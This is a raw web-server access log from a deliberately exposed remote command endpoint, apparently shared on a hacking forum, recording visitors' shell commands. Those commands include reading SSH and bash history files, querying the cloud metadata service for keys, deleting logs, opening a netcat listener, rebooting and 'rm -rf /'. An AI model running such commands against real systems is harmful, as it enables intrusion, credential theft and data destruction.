188.207.241.66 - - [19/Jan/2015:13:25:23 +0000] "GET /run?command=ls%20/home/ubuntu HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:25:29 +0000] "GET /run?command=ls%20-a%20/home/ubuntu HTTP/1.1" 200 81 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:25:42 +0000] "GET /run?command=cat%20/home/ubuntu/.ssh HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
213.74.127.134 - - [19/Jan/2015:13:25:45 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/|tr%20-cs%20%20%27\x5Cn%27%20%22%3Cbr%3E%22 HTTP/1.1" 200 36 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:25:53 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/|tr%20-cs%20%20%27\x5Cn%27%20%22%22 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.207.241.66 - - [19/Jan/2015:13:25:53 +0000] "GET /run?command=ls%20-a%20/home/python HTTP/1.1" 200 19 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
213.74.127.134 - - [19/Jan/2015:13:25:55 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/|tr%20-cs%20%20%27\x5Cn%27%20 HTTP/1.1" 200 186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:26:06 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/|tr%20-cs%20%20%22\x5Cn%22%20 HTTP/1.1" 200 186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:26:10 +0000] "GET /run?command=cat%20/var/log/nginx/python.access.log HTTP/1.1" 200 17 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
188.207.241.66 - - [19/Jan/2015:13:26:11 +0000] "GET /run?command=cat%20/home/python/.bash_history HTTP/1.1" 200 109 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
71.85.197.188 - - [19/Jan/2015:13:26:12 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Linux; Android 4.4.4; SM-G900P Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36"
71.85.197.188 - - [19/Jan/2015:13:26:12 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Linux; Android 4.4.4; SM-G900P Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:26:18 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 624 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:26:26 +0000] "GET /run?command=rm%20/var/log/nginx/python.access.log HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
213.74.127.134 - - [19/Jan/2015:13:26:41 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/|tr%20-cs%20%20%22\x5Cn%22%20%22%3Cbr%3E%22 HTTP/1.1" 200 36 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.207.241.66 - - [19/Jan/2015:13:26:43 +0000] "GET /run?command=cd%20/var/log HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:26:47 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:26:56 +0000] "GET /run?command=cd%20var HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
213.74.127.134 - - [19/Jan/2015:13:26:59 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/|tr%20-c%20%20%22\x5Cn%22%20%22%3Cbr%3E%22 HTTP/1.1" 200 84 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.207.241.66 - - [19/Jan/2015:13:27:00 +0000] "GET /run?command=cd%20log HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
213.74.127.134 - - [19/Jan/2015:13:27:04 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/|tr%20%20%20%22\x5Cn%22%20%22%3Cbr%3E%22 HTTP/1.1" 200 186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.207.241.66 - - [19/Jan/2015:13:27:04 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
77.174.223.87 - - [19/Jan/2015:13:27:04 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
77.174.223.87 - - [19/Jan/2015:13:27:05 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
77.174.223.87 - - [19/Jan/2015:13:27:05 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
150.70.172.232 - - [19/Jan/2015:13:27:09 +0000] "GET / HTTP/1.1" 404 233 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
188.207.241.66 - - [19/Jan/2015:13:27:11 +0000] "GET /run?command=ls;ls HTTP/1.1" 200 127 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
78.172.44.50 - - [19/Jan/2015:13:27:16 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 552 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
213.74.127.134 - - [19/Jan/2015:13:27:19 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:27:25 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/security-groups HTTP/1.1" 200 15 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.207.241.66 - - [19/Jan/2015:13:27:31 +0000] "GET /run?command=echo%20$(10%20+%20100)) HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:27:34 +0000] "GET /run?command=echo%20$(10%20+%20100) HTTP/1.1" 200 1 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:27:39 +0000] "GET /run?command=echo%20hello HTTP/1.1" 200 6 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
73.188.162.50 - - [19/Jan/2015:13:27:40 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 209 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
70.126.23.3 - - [19/Jan/2015:13:27:41 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 209 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
188.207.241.66 - - [19/Jan/2015:13:27:49 +0000] "GET /run?command=echo%20\x5C$((1%20+%201)) HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:28:04 +0000] "GET /run?command=echo%20$%27\x5Cx31%27 HTTP/1.1" 200 6 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
213.74.127.134 - - [19/Jan/2015:13:28:05 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/public-keys HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
38.119.133.34 - - [19/Jan/2015:13:28:05 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257"
213.74.127.134 - - [19/Jan/2015:13:28:14 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/public-keys/ HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:28:17 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/public-keyss/ HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:28:17 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
150.70.173.45 - - [19/Jan/2015:13:28:19 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 2244 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
188.207.241.66 - - [19/Jan/2015:13:28:26 +0000] "GET /run?command=echo%20$\x5C%27\x5Cx31\x5C%27 HTTP/1.1" 200 7 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
213.74.127.134 - - [19/Jan/2015:13:28:34 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/public-keys/0 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
150.70.173.57 - - [19/Jan/2015:13:28:36 +0000] "GET /run?command=cat%20/var/log/nginx/python.access.log HTTP/1.1" 200 17 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
188.207.241.66 - - [19/Jan/2015:13:28:37 +0000] "GET /run?command=echo%20\x5C$\x5C%27\x5Cx31\x5C%27 HTTP/1.1" 200 7 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
150.70.173.5 - - [19/Jan/2015:13:28:37 +0000] "GET /run?command=rm%20/var/log/nginx/python.access.log HTTP/1.1" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
213.74.127.134 - - [19/Jan/2015:13:28:38 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/public-keys/0 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:28:55 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key HTTP/1.1" 200 360 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
74.67.220.208 - - [19/Jan/2015:13:29:06 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
74.67.220.208 - - [19/Jan/2015:13:29:06 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.207.241.66 - - [19/Jan/2015:13:29:09 +0000] "GET /run?command=nc%20-l%2012345 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
74.67.220.208 - - [19/Jan/2015:13:29:15 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
50.199.88.145 - - [19/Jan/2015:13:29:59 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
50.199.88.145 - - [19/Jan/2015:13:30:00 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
50.199.88.145 - - [19/Jan/2015:13:30:00 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 616 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
150.70.172.231 - - [19/Jan/2015:13:31:08 +0000] "GET /run?command=sudo%2520reboot HTTP/1.1" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
81.147.72.27 - - [19/Jan/2015:13:31:08 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.147.72.27 - - [19/Jan/2015:13:31:08 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:31:14 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:31:14 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
60.241.56.114 - - [19/Jan/2015:13:31:34 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 539 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
60.241.56.114 - - [19/Jan/2015:13:31:38 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 497 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
60.241.56.114 - - [19/Jan/2015:13:31:39 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
60.241.56.114 - - [19/Jan/2015:13:31:54 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:31:59 +0000] "GET /run?command=crontab%20-l HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
130.209.157.43 - - [19/Jan/2015:13:32:06 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
130.209.157.43 - - [19/Jan/2015:13:32:06 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
130.209.157.43 - - [19/Jan/2015:13:32:06 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
194.209.124.194 - - [19/Jan/2015:13:32:22 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.209.124.194 - - [19/Jan/2015:13:32:22 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.209.124.194 - - [19/Jan/2015:13:32:28 +0000] "GET /run?command=whoami HTTP/1.1" 200 7 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.209.124.194 - - [19/Jan/2015:13:32:35 +0000] "GET /run?command=find+/ HTTP/1.1" 200 17 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:32:39 +0000] "GET /run?command=wget%20google.com HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
194.209.124.194 - - [19/Jan/2015:13:32:40 +0000] "GET /run?command=find+/usr HTTP/1.1" 200 17 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.209.124.194 - - [19/Jan/2015:13:32:43 +0000] "GET /run?command=find+/var HTTP/1.1" 200 17 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:32:44 +0000] "GET /run?command=curl HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
194.209.124.194 - - [19/Jan/2015:13:32:47 +0000] "GET /run?command=find+/var/www HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:32:49 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
194.209.124.194 - - [19/Jan/2015:13:32:51 +0000] "GET /run?command=find+/home HTTP/1.1" 200 116 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:32:56 +0000] "GET /run?command=ls%20-l%20-h HTTP/1.1" 200 386 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
194.209.124.194 - - [19/Jan/2015:13:33:05 +0000] "GET /run?command=cat+/home/python/.bash_history HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:33:06 +0000] "GET /run?command=ls%20-l%20-h%20/home HTTP/1.1" 200 98 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:33:12 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 398 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:33:15 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 413 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:33:21 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:33:22 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 411 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:33:26 +0000] "GET /run?command=cat%20/home/python/.bash_history HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
82.44.71.236 - - [19/Jan/2015:13:33:26 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 469 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:33:30 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 465 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:33:45 +0000] "GET /run?command=tail%20/root/.bash_history HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
217.42.163.206 - - [19/Jan/2015:13:33:46 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "https://www.reddit.com/r/hacking/comments/2sv2jh/this_is_running_on_my_server_do_whatever_you_like/" "Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53"
190.0.62.238 - - [19/Jan/2015:13:33:50 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
190.0.62.238 - - [19/Jan/2015:13:33:50 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:33:50 +0000] "GET /run?command=tail%20/home/.bash_history HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:33:56 +0000] "GET /run?command=whoami HTTP/1.1" 200 7 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
190.0.62.238 - - [19/Jan/2015:13:34:00 +0000] "GET /run?command=dir HTTP/1.1" 200 137 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
190.0.62.238 - - [19/Jan/2015:13:34:07 +0000] "GET /run?command=midkr HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:34:11 +0000] "GET /run?command=ls%20-l%20-h%20/home/python/ HTTP/1.1" 200 8 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
190.0.62.238 - - [19/Jan/2015:13:34:11 +0000] "GET /run?command=mkdir HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
190.0.62.238 - - [19/Jan/2015:13:34:19 +0000] "GET /run?command=%22mkdir%20jota%22 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:34:20 +0000] "GET /run?command=tail%20/home/python/.bash_history HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
190.0.62.238 - - [19/Jan/2015:13:34:25 +0000] "GET /run?command=mkdir%20jota HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
190.0.62.238 - - [19/Jan/2015:13:34:28 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.44.71.236 - - [19/Jan/2015:13:34:33 +0000] "GET /run?command=rm%20-rf%20/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
190.0.62.238 - - [19/Jan/2015:13:34:45 +0000] "GET /run?command=cd%20usr HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
190.0.62.238 - - [19/Jan/2015:13:34:50 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
